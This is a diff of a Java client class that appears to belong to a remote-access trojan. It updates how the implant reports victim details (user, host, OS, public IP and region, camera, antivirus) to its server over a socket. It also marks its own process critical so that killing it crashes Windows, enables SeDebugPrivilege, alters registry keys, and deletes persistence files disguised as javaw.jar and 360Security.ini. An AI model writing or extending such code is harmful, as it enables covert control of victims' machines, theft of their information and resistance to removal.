@@ -1,8 +1,5 @@
 package me.client;
 
-import com.sun.jna.Memory;
-import com.sun.jna.Pointer;
-import com.sun.jna.WString;
 import com.sun.jna.platform.win32.*;
 import me.client.filecopy.Copy;
 import me.client.send.*;
@@ -11,14 +8,14 @@ import me.client.utils.*;
 
 import java.io.*;
 import java.net.*;
-import java.nio.charset.StandardCharsets;
 import javax.swing.*;
 
 import static com.sun.jna.platform.win32.WinBase.MUTEX_ALL_ACCESS;
 import static com.sun.jna.platform.win32.WinDef.MAX_PATH;
+import static com.sun.jna.platform.win32.WinNT.*;
 
 public class Client {
-    public static final String VERSION = "8";
+    public static final String VERSION = "8.6";
     public static boolean isturn = false;
     public static Socket socket;
     public static InetSocketAddress inetSocketAddress;
@@ -123,10 +120,14 @@ public class Client {
     public static void relieve(){
         //解除主机
         File file = new File(getWindowsPath1() + "\\WindowsConfig.ini");
-        LoadDLL.instance.RemoveProcessIsCritical();
+        File file1 = new File(System.getProperty("user.home") + "\\AppData\\SetUp\\javaw.jar");
+        File file2 = new File(System.getProperty("user.home") + "\\AppData\\SetUp\\360Security.ini");
+        LoadNtdll.instance.RtlSetProcessIsCritical(new WinDef.BOOL(false),null,new WinDef.BOOL(false));
         Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup","wowWTF");
         Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000001);
         file.delete();
+        file1.delete();
+        file2.delete();
         System.exit(0);
     }
     public static void lock() {
@@ -140,8 +141,8 @@ public class Client {
         UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
         lock();
         register();
-        LoadDLL.instance.EnableDebugPriv();
-        LoadDLL.instance.SetProcessIsCritical();
+        enableSEDebugNamePriv();
+        LoadNtdll.instance.RtlSetProcessIsCritical(new WinDef.BOOL(true),null,new WinDef.BOOL(false));
         new ShutdownChecker().start();
         inetSocketAddress = new InetSocketAddress(getIP(),getPort());
         try {
@@ -151,25 +152,31 @@ public class Client {
         }catch (Exception e) {
         }
     }
+    public static void enableSEDebugNamePriv() {
+        WinNT.LUID luid = new WinNT.LUID();
+        LUID_AND_ATTRIBUTES luid_and_attributes = new LUID_AND_ATTRIBUTES();
+        WinNT.HANDLEByReference handle = new WinNT.HANDLEByReference();
+        WinNT.TOKEN_PRIVILEGES token_privileges = new WinNT.TOKEN_PRIVILEGES(1);
+        Advapi32.INSTANCE.OpenProcessToken(Kernel32.INSTANCE.GetCurrentProcess(),TOKEN_ALL_ACCESS,handle);
+        Advapi32.INSTANCE.LookupPrivilegeValue(null,SE_DEBUG_NAME,luid);
+        token_privileges.PrivilegeCount = new WinDef.DWORD(1);
+        luid_and_attributes.Attributes = new DWORD(SE_PRIVILEGE_ENABLED);
+        luid_and_attributes.Luid = luid;
+        token_privileges.Privileges[0] = luid_and_attributes;
+        Advapi32.INSTANCE.AdjustTokenPrivileges(handle.getValue(),false,token_privileges,token_privileges.size(),null,null);
+    }
     public static void con() {
         try {
             socket = new Socket();
+            socket.setSoLinger(true,0);
             socket.connect(inetSocketAddress);
             isturn = true;
             JarUtil jarUtil = new JarUtil(Client.class);
             String IP = GetInternetIP.getIP();
-            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
-            dataOutputStream.writeUTF(getHead());
-            dataOutputStream.writeUTF(System.getProperty("user.name"));
-            dataOutputStream.writeUTF(InetAddress.getLocalHost().getHostName());
-            dataOutputStream.writeUTF(System.getProperty("os.name"));
-            dataOutputStream.writeUTF(IP);
-            dataOutputStream.writeUTF(GetInternetIP.getRegion(IP));
-            dataOutputStream.writeUTF(jarUtil.getJarName());
-            dataOutputStream.writeUTF(SystemInfo.getCurrentPID());
-            dataOutputStream.writeUTF(SystemInfo.camera());
-            dataOutputStream.writeUTF(VERSION);
-            new GetAntivirus(dataOutputStream).start();
+            SendMessage.send(MessageFlags.CLIENT_HEAD,getHead().getBytes("GBK"),socket);
+            String info = System.getProperty("user.name")+"$"+InetAddress.getLocalHost().getHostName()+"$"+System.getProperty("os.name")+"$"+IP+"$"+GetInternetIP.getRegion(IP)+"$"+jarUtil.getJarName()+"$"+
+                    SystemInfo.getCurrentPID()+"$"+SystemInfo.camera()+"$"+VERSION +"$" + GetAntivirus.get();
+            SendMessage.send(MessageFlags.CLIENT_LOGIN,info.getBytes("GBK"),socket);
             new SendHeartPack(socket).start();
             new ReceiveMessage(socket).start();
         }catch (Exception e) {
